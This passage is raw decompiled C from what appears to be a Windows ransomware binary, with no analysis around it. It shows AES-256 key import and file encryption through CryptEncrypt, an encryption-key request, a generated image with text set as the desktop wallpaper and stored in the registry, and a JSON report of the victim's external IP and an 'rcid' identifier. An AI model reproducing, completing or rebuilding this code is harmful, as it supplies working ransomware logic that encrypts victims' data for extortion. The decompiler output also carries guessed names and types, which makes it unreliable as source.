        (*(void (__thiscall **)(volatile signed __int32 *))(*v19 + 4))(v19);
    }
  }
  *(_DWORD *)v34 = Block;
  v23 = 0;
  v40 = 0;
  v41[0] = 2;
  v41[1] = 18;
  v39 = &ANEventGetBuildType::`vftable';
  v42 = 0;
  LOBYTE(v43) = 20;
  v24 = (int)v31;
  v25 = (int *)*((_DWORD *)v31 + 1);
  if ( v25 )
  {
    v40 = *((_DWORD *)v31 + 3);
    sub_40FC10(v25, &v28, v41);
    if ( !*((_BYTE *)v30 + 13) && *((int *)v30 + 4) <= 2 && v30 != **(volatile signed __int32 ***)(v24 + 4) )
    {
      (*(void (__thiscall **)(_DWORD, void ***))(**((_DWORD **)v30 + 5) + 8))(*((_DWORD *)v30 + 5), &v39);
      v23 = v42;
    }
  }
  v26 = *(_DWORD *)(v24 + 120);
  result = v24;
  *(_DWORD *)(v24 + 32) = v23;
  *(_DWORD *)(v26 + 24) = v23;
  return result;
}
// 41F2CD: variable 'v15' is possibly undefined
// 4B16EC: using guessed type void *ANNetworkModule::`vftable';
// 4B1700: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
// 4B1768: using guessed type void *ANSystemModule::`vftable';
// 4B19C0: using guessed type void *ANCore::`vftable';
// 4B19F0: using guessed type void *ANEventGetBuildType::`vftable';

//----- (0041F4B0) --------------------------------------------------------
_DWORD *__thiscall sub_41F4B0(_DWORD *Block, char a2)
{
  sub_41F4E0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041F4E0) --------------------------------------------------------
void __thiscall sub_41F4E0(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  void (__thiscall ***v3)(_DWORD, int); // ecx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  void (__thiscall ***v5)(_DWORD, int); // ecx
  void (__thiscall ***v6)(_DWORD, int); // ecx
  void (__thiscall ***v7)(_DWORD, int); // ecx
  unsigned int v8; // ecx
  _DWORD *v9; // eax
  unsigned int v10; // ecx
  _DWORD *v11; // eax
  unsigned int v12; // ecx
  void *v13; // eax
  volatile signed __int32 *v14; // edi

  *this = &ANCore::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[34];
  if ( v2 )
    (**v2)(v2, 1);
  v3 = (void (__thiscall ***)(_DWORD, int))this[33];
  if ( v3 )
    (**v3)(v3, 1);
  v4 = (void (__thiscall ***)(_DWORD, int))this[32];
  if ( v4 )
    (**v4)(v4, 1);
  v5 = (void (__thiscall ***)(_DWORD, int))this[31];
  if ( v5 )
    (**v5)(v5, 1);
  v6 = (void (__thiscall ***)(_DWORD, int))this[30];
  if ( v6 )
    (**v6)(v6, 1);
  v7 = (void (__thiscall ***)(_DWORD, int))this[29];
  if ( v7 )
    (**v7)(v7, 1);
  v8 = this[28];
  if ( v8 >= 8 )
  {
    v9 = (_DWORD *)this[23];
    if ( 2 * v8 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v9 - *(v9 - 1) - 4 > 0x1F )
        goto LABEL_33;
      v9 = (_DWORD *)*(v9 - 1);
    }
    sub_44775B(v9);
  }
  this[27] = 0;
  this[28] = 7;
  *((_WORD *)this + 46) = 0;
  v10 = this[22];
  if ( v10 >= 8 )
  {
    v11 = (_DWORD *)this[17];
    if ( 2 * v10 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v11 - *(v11 - 1) - 4 > 0x1F )
        goto LABEL_33;
      v11 = (_DWORD *)*(v11 - 1);
    }
    sub_44775B(v11);
  }
  this[21] = 0;
  this[22] = 7;
  *((_WORD *)this + 34) = 0;
  v12 = this[16];
  if ( v12 >= 8 )
  {
    v13 = (void *)this[11];
    if ( 2 * v12 + 2 < 0x1000 )
    {
LABEL_27:
      sub_44775B(v13);
      goto LABEL_28;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_27;
    }
LABEL_33:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_28:
  this[15] = 0;
  this[16] = 7;
  *((_WORD *)this + 22) = 0;
  *this = &ANICore::`vftable';
  v14 = (volatile signed __int32 *)this[7];
  if ( v14 )
  {
    if ( !_InterlockedExchangeAdd(v14 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v14)(v14);
      if ( !_InterlockedDecrement(v14 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v14 + 4))(v14);
    }
  }
  sub_40F840(this);
}
// 49E63C: using guessed type void *ANICore::`vftable';
// 4B19C0: using guessed type void *ANCore::`vftable';

//----- (0041F670) --------------------------------------------------------
void __stdcall sub_41F670(int *a1)
{
  int i; // edi
  int j; // esi
  int v3; // eax
  int v4; // eax
  _DWORD *v5; // esi
  int v6; // eax
  char *v7; // edi
  int v8; // eax
  char *v9; // edx
  int v10; // ecx
  unsigned int v11; // eax
  _QWORD *v12; // eax
  _DWORD *v13; // eax
  unsigned int v14; // ecx
  char *v15; // eax
  _QWORD *v16; // eax
  void *v17; // ecx
  void *v18; // ecx
  void *v19; // ecx
  void *v20; // ecx
  void *v21; // ecx
  void *v22; // ecx
  void *v23; // ecx
  _DWORD *v24; // eax
  int v25; // edx
  int v26; // ecx
  void *v27; // ecx
  PVOID *v28; // eax
  int v29; // eax
  char v30; // al
  void *v31; // ecx
  PVOID *v32; // esi
  DWORD v33; // edi
  int v34; // eax
  void *v35; // ecx
  PVOID v36; // ecx
  int v37; // [esp+8h] [ebp-120h]
  void *v38[5]; // [esp+14h] [ebp-114h] BYREF
  unsigned int v39; // [esp+28h] [ebp-100h]
  void *v40[5]; // [esp+2Ch] [ebp-FCh] BYREF
  unsigned int v41; // [esp+40h] [ebp-E8h]
  void *v42[5]; // [esp+44h] [ebp-E4h] BYREF
  unsigned int v43; // [esp+58h] [ebp-D0h]
  void *v44[5]; // [esp+5Ch] [ebp-CCh] BYREF
  unsigned int v45; // [esp+70h] [ebp-B8h]
  void *v46[5]; // [esp+74h] [ebp-B4h] BYREF
  unsigned int v47; // [esp+88h] [ebp-A0h]
  void *v48[5]; // [esp+8Ch] [ebp-9Ch] BYREF
  unsigned int v49; // [esp+A0h] [ebp-88h]
  int *v50; // [esp+A4h] [ebp-84h]
  void *Src[4]; // [esp+A8h] [ebp-80h] BYREF
  __int64 v52; // [esp+B8h] [ebp-70h]
  char v53; // [esp+C3h] [ebp-65h]
  HKEY phkResult; // [esp+C4h] [ebp-64h] BYREF
  int v55[4]; // [esp+C8h] [ebp-60h] BYREF
  char v56; // [esp+D8h] [ebp-50h]
  void *Block; // [esp+DCh] [ebp-4Ch]
  PVOID pvParam[4]; // [esp+E0h] [ebp-48h] BYREF
  __int64 v59; // [esp+F0h] [ebp-38h]
  int v60; // [esp+F8h] [ebp-30h] BYREF
  unsigned int v61; // [esp+FCh] [ebp-2Ch] BYREF
  void *v62[4]; // [esp+100h] [ebp-28h] BYREF
  int v63[2]; // [esp+110h] [ebp-18h]
  int v64; // [esp+124h] [ebp-4h]
  int savedregs; // [esp+128h] [ebp+0h] BYREF

  v50 = a1;
  if ( !a1[4] )
    return;
  v62[1] = (void *)-1110322735;
  v62[2] = (void *)1970650557;
  v62[3] = (void *)875836533;
  v63[0] = 139415375;
  LOWORD(v63[1]) = 2056;
  sub_421F20(v55, 800, 600, 1, 3);
  v64 = 0;
  for ( i = 0; i < 800; ++i )
  {
    for ( j = 0; j < 600; ++j )
    {
      v3 = rand();
      sub_42CE80(v55, i, j, 6, (char *)&v62[1] + 2 * (v3 % 6) + v3 % 6, 1.0);
    }
  }
  v4 = (int)v50;
  LOWORD(v61) = 2323;
  BYTE2(v61) = 10;
  qmemcpy(&v60, "uEE", 3);
  if ( (unsigned int)v50[5] >= 0x10 )
    v4 = *v50;
  sub_42B8A0(v55, 50, 100, v4, (int)&v60, (int)&v61, 1065353216, 0x32u, v37);
  v5 = (_DWORD *)sub_40C780(&dword_4FA1E0, (int)v38, (int)&savedregs);
  LOBYTE(v64) = 1;
  v6 = sub_40C780(&dword_4FA1F8, (int)v40, (int)&savedregs);
  LOBYTE(v64) = 2;
  v7 = (char *)sub_414750(v42, v6);
  LOBYTE(v64) = 3;
  v8 = sub_40C780(&dword_4FA228, (int)v44, (int)&savedregs);
  LOBYTE(v64) = 4;
  v9 = (char *)sub_414750(v46, v8);
  LOBYTE(v64) = 5;
  v10 = *((_DWORD *)v9 + 5);
  v60 = *((_DWORD *)v9 + 4);
  v11 = *((_DWORD *)v7 + 4);
  v61 = v11;
  if ( v11 > v10 - v60 )
  {
    if ( *((_DWORD *)v7 + 5) - v61 >= v60 )
    {
      if ( *((_DWORD *)v9 + 5) >= 8u )
        v9 = *(char **)v9;
      v12 = sub_40B080((char **)v7, v60, v9, v60);
      goto LABEL_17;
    }
    v11 = v61;
  }
  if ( *((_DWORD *)v7 + 5) >= 8u )
    v7 = *(char **)v7;
  v12 = sub_4044A0(v9, v7, v11);
LABEL_17:
  v52 = 0i64;
  *(_OWORD *)Src = *(_OWORD *)v12;
  v52 = v12[2];
  *(_WORD *)v12 = 0;
  *((_DWORD *)v12 + 5) = 7;
  *((_DWORD *)v12 + 4) = 0;
  LOBYTE(v64) = 6;
  v13 = sub_4044A0(Src, "\\", 1u);
  v63[0] = 0;
  v63[1] = 0;
  *(_OWORD *)v62 = *(_OWORD *)v13;
  *(_QWORD *)v63 = *((_QWORD *)v13 + 2);
  v13[4] = 0;
  v13[5] = 7;
  *(_WORD *)v13 = 0;
  LOBYTE(v64) = 7;
  v14 = v5[4];
  if ( v14 <= v63[1] - v63[0] || v5[5] - v14 < v63[0] )
  {
    if ( v5[5] >= 8u )
      v5 = (_DWORD *)*v5;
    v16 = sub_4044A0(v62, v5, v14);
  }
  else
  {
    v15 = (char *)v62;
    if ( v63[1] >= 8u )
      v15 = (char *)v62[0];
    v16 = sub_40B080((char **)v5, v14, v15, v63[0]);
  }
  v59 = 0i64;
  *(_OWORD *)pvParam = *(_OWORD *)v16;
  v59 = v16[2];
  *(_WORD *)v16 = 0;
  *((_DWORD *)v16 + 5) = 7;
  *((_DWORD *)v16 + 4) = 0;
  LOBYTE(v64) = 9;
  if ( v63[1] >= 8u )
  {
    v17 = v62[0];
    if ( (unsigned int)(2 * v63[1] + 2) >= 0x1000 )
    {
      v17 = (void *)*((_DWORD *)v62[0] - 1);
      if ( (unsigned int)(v62[0] - v17 - 4) > 0x1F )
        goto LABEL_84;
    }
    sub_44775B(v17);
  }
  v63[0] = 0;
  v63[1] = 7;
  LOWORD(v62[0]) = 0;
  LOBYTE(v64) = 10;
  if ( HIDWORD(v52) >= 8 )
  {
    v18 = Src[0];
    if ( (unsigned int)(2 * HIDWORD(v52) + 2) >= 0x1000 )
    {
      v18 = (void *)*((_DWORD *)Src[0] - 1);
      if ( (unsigned int)(Src[0] - v18 - 4) > 0x1F )
        goto LABEL_84;
    }
    sub_44775B(v18);
  }
  v52 = 0x700000000i64;
  LOWORD(Src[0]) = 0;
  LOBYTE(v64) = 11;
  if ( v47 >= 8 )
  {
    v19 = v46[0];
    if ( 2 * v47 + 2 >= 0x1000 )
    {
      v19 = (void *)*((_DWORD *)v46[0] - 1);
      if ( (unsigned int)(v46[0] - v19 - 4) > 0x1F )
        goto LABEL_84;
    }
    sub_44775B(v19);
  }
  v46[4] = 0;
  v47 = 7;
  LOWORD(v46[0]) = 0;
  LOBYTE(v64) = 12;
  if ( v45 >= 8 )
  {
    v20 = v44[0];
    if ( 2 * v45 + 2 >= 0x1000 )
    {
      v20 = (void *)*((_DWORD *)v44[0] - 1);
      if ( (unsigned int)(v44[0] - v20 - 4) > 0x1F )
        goto LABEL_84;
    }
    sub_44775B(v20);
  }
  v44[4] = 0;
  v45 = 7;
  LOWORD(v44[0]) = 0;
  LOBYTE(v64) = 13;
  if ( v43 >= 8 )
  {
    v21 = v42[0];
    if ( 2 * v43 + 2 >= 0x1000 )
    {
      v21 = (void *)*((_DWORD *)v42[0] - 1);
      if ( (unsigned int)(v42[0] - v21 - 4) > 0x1F )
        goto LABEL_84;
    }
    sub_44775B(v21);
  }
  v42[4] = 0;
  v43 = 7;
  LOWORD(v42[0]) = 0;
  LOBYTE(v64) = 14;
  if ( v41 >= 8 )
  {
    v22 = v40[0];
    if ( 2 * v41 + 2 >= 0x1000 )
    {
      v22 = (void *)*((_DWORD *)v40[0] - 1);
      if ( (unsigned int)(v40[0] - v22 - 4) > 0x1F )
        goto LABEL_84;
    }
    sub_44775B(v22);
  }
  v40[4] = 0;
  v41 = 7;
  LOWORD(v40[0]) = 0;
  LOBYTE(v64) = 15;
  if ( v39 >= 8 )
  {
    v23 = v38[0];
    if ( 2 * v39 + 2 < 0x1000 || (v23 = (void *)*((_DWORD *)v38[0] - 1), (unsigned int)(v38[0] - v23 - 4) <= 0x1F) )
    {
      sub_44775B(v23);
      goto LABEL_53;
    }
LABEL_84:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_53:
  v38[4] = 0;
  v39 = 7;
  LOWORD(v38[0]) = 0;
  v24 = sub_405EF0(v48, (const WCHAR *)pvParam);
  LOBYTE(v64) = 16;
  if ( v24[5] >= 0x10u )
    v24 = (_DWORD *)*v24;
  sub_4224B0(v55, v25, v26, (int)v24);
  LOBYTE(v64) = 15;
  if ( v49 >= 0x10 )
  {
    v27 = v48[0];
    if ( v49 + 1 >= 0x1000 )
    {
      v27 = (void *)*((_DWORD *)v48[0] - 1);
      if ( (unsigned int)(v48[0] - v27 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v27);
  }
  v28 = pvParam;
  if ( HIDWORD(v59) >= 8 )
    v28 = (PVOID *)pvParam[0];
  SystemParametersInfoW(0x14u, 0, v28, 3u);
  v29 = sub_40C780(&dword_4FA108, (int)v48, (int)&savedregs);
  if ( *(_DWORD *)(v29 + 20) >= 8u )
    v29 = *(_DWORD *)v29;
  v30 = RegOpenKeyExW(HKEY_CURRENT_USER, (LPCWSTR)v29, 0, 2u, &phkResult) == 0;
  v53 = v30;
  if ( v49 >= 8 )
  {
    v31 = v48[0];
    if ( 2 * v49 + 2 >= 0x1000 )
    {
      v31 = (void *)*((_DWORD *)v48[0] - 1);
      if ( (unsigned int)(v48[0] - v31 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v31);
    v30 = v53;
  }
  if ( v30 )
  {
    v32 = pvParam;
    if ( HIDWORD(v59) >= 8 )
      v32 = (PVOID *)pvParam[0];
    v33 = 2 * v59;
    v34 = sub_40C780(&dword_4FA570, (int)v48, (int)&savedregs);
    if ( *(_DWORD *)(v34 + 20) >= 8u )
      v34 = *(_DWORD *)v34;
    RegSetValueExW(phkResult, (LPCWSTR)v34, 0, 1u, (const BYTE *)v32, v33);
    if ( v49 >= 8 )
    {
      v35 = v48[0];
      if ( 2 * v49 + 2 >= 0x1000 )
      {
        v35 = (void *)*((_DWORD *)v48[0] - 1);
        if ( (unsigned int)(v48[0] - v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_44775B(v35);
    }
    RegCloseKey(phkResult);
  }
  if ( HIDWORD(v59) >= 8 )
  {
    v36 = pvParam[0];
    if ( (unsigned int)(2 * HIDWORD(v59) + 2) >= 0x1000 )
    {
      v36 = (PVOID)*((_DWORD *)pvParam[0] - 1);
      if ( (unsigned int)(pvParam[0] - v36 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v36);
  }
  v59 = 0x700000000i64;
  LOWORD(pvParam[0]) = 0;
  if ( !v56 )
    j_j__free(Block);
}
// 41F76B: variable 'v37' is possibly undefined
// 41FBB1: variable 'v25' is possibly undefined
// 41FBB1: variable 'v26' is possibly undefined
// 41F670: using guessed type int var_60[4];

//----- (0041FDA0) --------------------------------------------------------
int __stdcall sub_41FDA0(int a1, int a2, DWORD a3, int a4)
{
  _OWORD *v4; // edi
  bool v5; // cf
  const BYTE *v6; // eax
  size_t *v7; // edi
  BYTE *v8; // eax
  BYTE *v9; // eax
  BYTE **v10; // eax
  __int128 v11; // xmm0
  int result; // eax
  _BYTE pbData[44]; // [esp+10h] [ebp-6Ch] BYREF
  BYTE v14[4]; // [esp+3Ch] [ebp-40h] BYREF
  BYTE *v15[4]; // [esp+40h] [ebp-3Ch] BYREF
  __int64 v16; // [esp+50h] [ebp-2Ch]
  HCRYPTPROV phProv; // [esp+58h] [ebp-24h] BYREF
  DWORD v18; // [esp+5Ch] [ebp-20h] BYREF
  HCRYPTKEY hKey; // [esp+60h] [ebp-1Ch] BYREF
  DWORD pdwDataLen; // [esp+64h] [ebp-18h] BYREF
  HCRYPTKEY phKey[5]; // [esp+68h] [ebp-14h] BYREF

  v4 = (_OWORD *)a2;
  v18 = a3;
  v16 = 0xF00000000i64;
  LOBYTE(v15[0]) = 0;
  phKey[4] = 0;
  if ( *(_DWORD *)(a2 + 16) == 32 && *(_DWORD *)(a3 + 16) == 16 )
  {
    pdwDataLen = a4 + 16;
    if ( *(_DWORD *)(a4 + 16) )
    {
      phProv = 0;
      if ( CryptAcquireContextW(&phProv, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18u, 0xF0000000) )
      {
        phKey[0] = 0;
        memset(&pbData[1], 0, 0x2Bu);
        *(_DWORD *)pbData = 520;
        v5 = *(_DWORD *)(a2 + 20) < 0x10u;
        *(_DWORD *)&pbData[4] = 26128;
        *(_DWORD *)&pbData[8] = 32;
        if ( !v5 )
          v4 = *(_OWORD **)a2;
        *(_OWORD *)&pbData[12] = *v4;
        *(_OWORD *)&pbData[28] = v4[1];
        if ( CryptImportKey(phProv, pbData, 0x2Cu, 0, 1u, phKey) )
        {
          v6 = (const BYTE *)v18;
          if ( *(_DWORD *)(v18 + 20) >= 0x10u )
            v6 = *(const BYTE **)v18;
          if ( CryptSetKeyParam(phKey[0], 1u, v6, 0) )
          {
            *(_DWORD *)v14 = 1;
            CryptSetKeyParam(phKey[0], 4u, v14, 0);
            hKey = 0;
            if ( CryptDuplicateKey(phKey[0], 0, 0, &hKey) )
            {
              v7 = (size_t *)pdwDataLen;
              pdwDataLen = *(_DWORD *)pdwDataLen;
              if ( CryptEncrypt(hKey, 0, 1, 0, 0, &pdwDataLen, 0) )
              {
                v8 = (BYTE *)a4;
                if ( v15 != (BYTE **)a4 )
                {
                  if ( *(_DWORD *)(a4 + 20) >= 0x10u )
                    v8 = *(BYTE **)a4;
                  sub_40A390((void **)v15, v8, *v7);
                }
                sub_40E9F0(v15, pdwDataLen, 0);
                v18 = *v7;
                v9 = (BYTE *)v15;
                if ( HIDWORD(v16) >= 0x10 )
                  v9 = v15[0];
                if ( CryptEncrypt(hKey, 0, 1, 0, v9, &v18, pdwDataLen) )
                {
                  sub_40E9F0(v15, v18, 0);
                }
                else
                {
                  v10 = v15;
                  LODWORD(v16) = 0;
                  if ( HIDWORD(v16) >= 0x10 )
                    v10 = (BYTE **)v15[0];
                  *(_BYTE *)v10 = 0;
                }
                CryptDestroyKey(hKey);
              }
            }
          }
          CryptDestroyKey(phKey[0]);
        }
        CryptReleaseContext(phProv, 0);
      }
    }
  }
  v11 = *(_OWORD *)v15;
  *(_DWORD *)(a1 + 16) = 0;
  result = a1;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v11;
  *(_QWORD *)(a1 + 16) = v16;
  return result;
}

//----- (00420000) --------------------------------------------------------
char __thiscall sub_420000(int *this)
{
  size_t v2; // ecx
  void **v3; // eax
  size_t v4; // ecx
  void **v5; // eax
  unsigned int v6; // ecx
  _BYTE *v7; // esi
  char v8; // al
  void **v9; // esi
  _BYTE *v10; // esi
  int v11; // ecx
  void **v12; // eax
  void **v13; // eax
  __int128 v14; // xmm0
  void *v15; // ecx
  void *v16; // ecx
  void **v17; // esi
  _BYTE *v18; // esi
  int v19; // ecx
  void **v20; // eax
  void **v21; // eax
  __int128 v22; // xmm0
  void *v23; // ecx
  void *v24; // ecx
  int v25; // ecx
  void **v26; // eax
  _QWORD *v27; // eax
  void *v28; // ecx
  char *v29; // edx
  void **v30; // eax
  void *v31; // ecx
  int v32; // ecx
  void **v33; // eax
  void **v34; // eax
  __int64 v35; // xmm0_8
  void *v36; // ecx
  void *v37; // ecx
  char *v38; // edx
  void **v39; // eax
  void *v40; // ecx
  const WCHAR *v41; // eax
  _DWORD *v42; // eax
  void *v43; // ecx
  void *v44; // ecx
  int v45; // eax
  void *v46; // ecx
  void *v47; // ecx
  _BYTE *v48; // ecx
  void *v49; // ecx
  void *v50; // ecx
  void *v51; // ecx
  void *v52; // ecx
  void *v53; // ecx
  void *v54; // ecx
  void *v55; // ecx
  void *v56; // ecx
  _BYTE *v57; // ecx
  void *v59[4]; // [esp+Ch] [ebp-1D8h] BYREF
  __int64 v60; // [esp+1Ch] [ebp-1C8h]
  void *Block[4]; // [esp+24h] [ebp-1C0h] BYREF
  __int64 v62; // [esp+34h] [ebp-1B0h]
  char v63; // [esp+3Fh] [ebp-1A5h]
  int v64; // [esp+40h] [ebp-1A4h]
  int v65[4]; // [esp+44h] [ebp-1A0h] BYREF
  unsigned int v66; // [esp+54h] [ebp-190h]
  int v67[4]; // [esp+58h] [ebp-18Ch] BYREF
  int v68[6]; // [esp+68h] [ebp-17Ch] BYREF
  int v69[6]; // [esp+80h] [ebp-164h] BYREF
  char v70; // [esp+98h] [ebp-14Ch]
  void *v71[4]; // [esp+9Ch] [ebp-148h] BYREF
  __int64 v72; // [esp+ACh] [ebp-138h]
  void *v73[5]; // [esp+B4h] [ebp-130h] BYREF
  unsigned int v74; // [esp+C8h] [ebp-11Ch]
  void *v75[5]; // [esp+CCh] [ebp-118h] BYREF
  unsigned int v76; // [esp+E0h] [ebp-104h]
  int v77[4]; // [esp+E4h] [ebp-100h] BYREF
  WCHAR WideCharStr[8]; // [esp+F4h] [ebp-F0h] BYREF
  int v79; // [esp+104h] [ebp-E0h]
  int v80; // [esp+108h] [ebp-DCh]
  int v81[4]; // [esp+10Ch] [ebp-D8h] BYREF
  void *v82; // [esp+11Ch] [ebp-C8h] BYREF
  int v83; // [esp+12Ch] [ebp-B8h]
  unsigned int v84; // [esp+130h] [ebp-B4h]
  int v85[4]; // [esp+134h] [ebp-B0h] BYREF
  void *v86; // [esp+144h] [ebp-A0h] BYREF
  int v87; // [esp+154h] [ebp-90h]
  unsigned int v88; // [esp+158h] [ebp-8Ch]
  void *v89[4]; // [esp+15Ch] [ebp-88h] BYREF
  int v90; // [esp+16Ch] [ebp-78h]
  unsigned int v91; // [esp+170h] [ebp-74h]
  void *v92[4]; // [esp+174h] [ebp-70h] BYREF
  size_t Size; // [esp+184h] [ebp-60h]
  unsigned int v94; // [esp+188h] [ebp-5Ch]
  void *v95[4]; // [esp+18Ch] [ebp-58h] BYREF
  int v96; // [esp+19Ch] [ebp-48h]
  unsigned int v97; // [esp+1A0h] [ebp-44h]
  void *Src[4]; // [esp+1A4h] [ebp-40h] BYREF
  int v99; // [esp+1B4h] [ebp-30h]
  unsigned int v100; // [esp+1B8h] [ebp-2Ch]
  void *v101[4]; // [esp+1BCh] [ebp-28h] BYREF
  int v102; // [esp+1CCh] [ebp-18h]
  unsigned int v103; // [esp+1D0h] [ebp-14h] BYREF
  int v104; // [esp+1E0h] [ebp-4h]
  int savedregs; // [esp+1E4h] [ebp+0h] BYREF

  v64 = 0;
  v81[1] = 0;
  v81[2] = 2;
  v81[3] = 36;
  v81[0] = (int)&ANEventGetEncKey::`vftable';
  v83 = 0;
  v84 = 15;
  LOBYTE(v82) = 0;
  v104 = 0;
  (*(void (__thiscall **)(int *, int *))(*this + 4))(this, v81);
  if ( v83 )
  {
    sub_41BEC0(v92, &v82);
    LOBYTE(v104) = 1;
    if ( !Size )
      goto LABEL_136;
    v2 = 16;
    v96 = 0;
    v97 = 15;
    LOBYTE(v95[0]) = 0;
    if ( Size < 0x10 )
      v2 = Size;
    v3 = v92;
    if ( v94 >= 0x10 )
      v3 = (void **)v92[0];
    sub_40A390(v95, v3, v2);
    LOBYTE(v104) = 2;
    v90 = 0;
    v91 = 15;
    LOBYTE(v89[0]) = 0;
    if ( Size < 0x10 )
      sub_404630();
    v4 = 32;
    if ( Size - 16 < 0x20 )
      v4 = Size - 16;
    v5 = v92;
    if ( v94 >= 0x10 )
      v5 = (void **)v92[0];
    sub_40A390(v89, v5 + 4, v4);
    LOBYTE(v104) = 3;
    if ( v96 && v90 )
    {
      v65[1] = 0;
      v65[2] = 2;
      v65[3] = 17;
      v65[0] = (int)&ANEventGetLid::`vftable';
      v66 = 0;
      LOBYTE(v104) = 4;
      (*(void (__thiscall **)(int *, int *))(*this + 4))(this, v65);
      v6 = v66;
      v7 = (char *)&v103 + 1;
      v64 = v66;
      do
      {
        --v7;
        v8 = v64 - 10 * (v6 / 0xA);
        v6 /= 0xAu;
        *v7 = v8 + 48;
        v64 = v6;
      }
      while ( v6 );
      v60 = 0xF00000000i64;
      LOBYTE(v59[0]) = 0;
      if ( v7 != (char *)&v103 + 1 )
        sub_40A390(v59, v7, (char *)&v103 + 1 - v7);
      *(_OWORD *)v71 = *(_OWORD *)v59;
      v72 = v60;
      v77[1] = 0;
      v77[2] = 7;
      v77[3] = 35;
      v77[0] = (int)&ANEventGetExternalIP::`vftable';
      v79 = 0;
      v80 = 7;
      WideCharStr[0] = 0;
      LOBYTE(v104) = 6;
      (*(void (__thiscall **)(int *, int *))(*this + 4))(this, v77);
      sub_405EF0(v73, WideCharStr);
      v85[1] = 0;
      v85[2] = 6;
      v85[3] = 6;
      v85[0] = (int)&ANEventGetID::`vftable';
      v87 = 0;
      v88 = 15;
      LOBYTE(v86) = 0;
      LOBYTE(v104) = 8;
      (*(void (__thiscall **)(int *, int *))(*this + 4))(this, v85);
      sub_41AFD0((int)v75, &v86);
      LOBYTE(v104) = 9;
      v99 = 0;
      v100 = 15;
      LOBYTE(Src[0]) = 0;
      sub_40A390(Src, L"{", 1u);
      LOBYTE(v104) = 11;
      v102 = 0;
      v103 = 15;
      LOBYTE(v101[0]) = 0;
      v64 = 63;
      sub_414300(v101, (unsigned int)v73[4] + 6);
      if ( v103 - v102 < 6 )
      {
        sub_40AD00(v101, 6u, v64, "\"ip\":\"", 6u);
      }
      else
      {
        v9 = v101;
        if ( v103 >= 0x10 )
          v9 = (void **)v101[0];
        v10 = (char *)v9 + v102;
        v102 += 6;
        memmove_0(v10, "\"ip\":\"", 6u);
        v10[6] = 0;
      }
      sub_409C70(v101, v73);
      v11 = v102;
      if ( v103 - v102 < 2 )
      {
        v13 = sub_40AD00(v101, 2u, v64, "\",", 2u);
      }
      else
      {
        v102 += 2;
        v12 = v101;
        if ( v103 >= 0x10 )
          v12 = (void **)v101[0];
        strcpy((char *)v12 + v11, "\",");
        v13 = v101;
      }
      v14 = *(_OWORD *)v13;
      v64 = 127;
      *(_OWORD *)Block = v14;
      v62 = *((_QWORD *)v13 + 2);
      v13[4] = 0;
      v13[5] = (void *)15;
      *(_BYTE *)v13 = 0;
      LOBYTE(v104) = 12;
      sub_409C70(Src, Block);
      LOBYTE(v104) = 11;
      if ( HIDWORD(v62) >= 0x10 )
      {
        v15 = Block[0];
        if ( (unsigned int)(HIDWORD(v62) + 1) >= 0x1000 )
        {
          v15 = (void *)*((_DWORD *)Block[0] - 1);
          if ( (unsigned int)(Block[0] - v15 - 4) > 0x1F )
            goto LABEL_147;
        }
        sub_44775B(v15);
      }
      LOBYTE(v104) = 10;
      if ( v103 < 0x10 )
        goto LABEL_36;
      v16 = v101[0];
      if ( v103 + 1 < 0x1000 || (v16 = (void *)*((_DWORD *)v101[0] - 1), (unsigned int)(v101[0] - v16 - 4) <= 0x1F) )
      {
        sub_44775B(v16);
LABEL_36:
        LOBYTE(v104) = 13;
        v102 = 0;
        v103 = 15;
        LOBYTE(v101[0]) = 0;
        v64 = 223;
        sub_414300(v101, (unsigned int)v75[4] + 8);
        if ( v103 - v102 < 8 )
        {
          sub_40AD00(v101, 8u, v64, "\"rcid\":\"", 8u);
        }
        else
        {
          v17 = v101;
          if ( v103 >= 0x10 )
            v17 = (void **)v101[0];
          v18 = (char *)v17 + v102;
          v102 += 8;
          memmove_0(v18, "\"rcid\":\"", 8u);
          v18[8] = 0;
        }
        sub_409C70(v101, v75);
        v19 = v102;
        if ( v103 == v102 )
        {
          v21 = sub_40AD00(v101, 1u, v64, "\"", 1u);
        }
        else
        {
          ++v102;
          v20 = v101;
          if ( v103 >= 0x10 )
            v20 = (void **)v101[0];
          *(_WORD *)((char *)v20 + v19) = 34;
          v21 = v101;
        }
        v22 = *(_OWORD *)v21;
        v64 = 479;
        *(_OWORD *)Block = v22;
        v62 = *((_QWORD *)v21 + 2);
        v21[4] = 0;
        v21[5] = (void *)15;
        *(_BYTE *)v21 = 0;
        LOBYTE(v104) = 14;
        sub_409C70(Src, Block);
        LOBYTE(v104) = 13;
        if ( HIDWORD(v62) >= 0x10 )
        {
          v23 = Block[0];
          if ( (unsigned int)(HIDWORD(v62) + 1) >= 0x1000 )
          {
            v23 = (void *)*((_DWORD *)Block[0] - 1);
            if ( (unsigned int)(Block[0] - v23 - 4) > 0x1F )
              goto LABEL_148;
          }
          sub_44775B(v23);
        }
        LOBYTE(v104) = 10;
        if ( v103 < 0x10 )
          goto LABEL_54;
        v24 = v101[0];
        if ( v103 + 1 < 0x1000 || (v24 = (void *)*((_DWORD *)v101[0] - 1), (unsigned int)(v101[0] - v24 - 4) <= 0x1F) )
        {
          sub_44775B(v24);
LABEL_54:
          v25 = v99;
